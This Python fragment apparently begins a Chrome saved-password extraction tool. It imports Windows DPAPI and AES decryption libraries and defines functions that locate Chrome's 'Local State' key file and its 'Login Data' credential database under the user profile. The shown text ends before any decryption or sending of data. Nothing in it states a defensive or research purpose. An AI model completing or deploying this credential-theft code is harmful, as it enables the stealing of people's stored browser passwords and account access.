import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES
def get_local_state() -> str:
    return os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Local State'
def get_login_data() -> str:
    return os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
